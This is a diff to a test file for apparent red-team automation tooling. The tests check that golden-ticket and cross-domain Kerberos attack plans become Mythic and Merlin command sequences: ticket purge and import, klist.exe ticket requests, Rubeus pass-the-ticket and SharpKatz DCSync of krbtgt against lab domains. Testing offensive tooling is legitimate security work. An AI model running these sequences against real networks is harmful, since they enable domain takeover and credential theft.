@@ -592,8 +592,8 @@ def test_adapter_translates_forge_golden_ticket_to_os_native_cross_domain_sequen
     mythic_plan = adapter.build_mythic_capability_commands(execution_plan)
 
     assert mythic_plan.ok is True
-    # Cross-domain forge: import the child TGT into the current session, then let Windows acquire the parent
-    # referral/service ticket naturally when the parent DCSync proof authenticates.
+    # Cross-domain forge: import the child TGT into the current session, then ask Windows to acquire the parent
+    # LDAP ticket before the parent DCSync proof authenticates.
     assert [command.command for command in mythic_plan.commands] == [
         "shell",
         "shell",
@@ -601,6 +601,7 @@ def test_adapter_translates_forge_golden_ticket_to_os_native_cross_domain_sequen
         "ticket_cache_purge",
         "ticket_cache_add",
         "ticket_cache_list",
+        "shell",
         "dcsync",
     ]
     preflight_list = mythic_plan.commands[0]
@@ -645,7 +646,11 @@ def test_adapter_translates_forge_golden_ticket_to_os_native_cross_domain_sequen
         "getSystemTickets": False,
     }
     assert mythic_plan.commands[5].consumes == ["kerberos_ticket_imported"]
-    proof = mythic_plan.commands[6]
+    acquire = mythic_plan.commands[6]
+    assert acquire.command == "shell"
+    assert acquire.parameters == "klist.exe get ldap/kingslanding.sevenkingdoms.local"
+    assert acquire.produces == ["kerberos_service_ticket_acquired"]
+    proof = mythic_plan.commands[7]
     assert proof.command == "dcsync"
     assert proof.parameters["domain"] == "sevenkingdoms.local"
     assert proof.parameters["user"] == "SEVENKINGDOMS\\krbtgt"
@@ -724,6 +729,7 @@ def test_merlin_cross_domain_default_uses_current_tgt_import_without_asktgs():
         "load-assembly",
         "invoke-assembly",
         "run",
+        "run",
         "load-assembly",
         "invoke-assembly",
     ]
@@ -732,8 +738,12 @@ def test_merlin_cross_domain_default_uses_current_tgt_import_without_asktgs():
         "assembly": "Rubeus.exe",
         "arguments": "ptt /ticket:{{kerberos_ticket_base64}}",
     }
-    assert mythic_plan.commands[7].parameters == {"filename": "SharpKatz.exe"}
-    assert mythic_plan.commands[8].parameters == {
+    assert mythic_plan.commands[7].parameters == {
+        "executable": "klist.exe",
+        "arguments": "get ldap/dc01.root.local",
+    }
+    assert mythic_plan.commands[8].parameters == {"filename": "SharpKatz.exe"}
+    assert mythic_plan.commands[9].parameters == {
         "assembly": "SharpKatz.exe",
         "arguments": "--Command dcsync --User ROOT\\krbtgt --Domain root.local --DomainController dc01.root.local",
     }
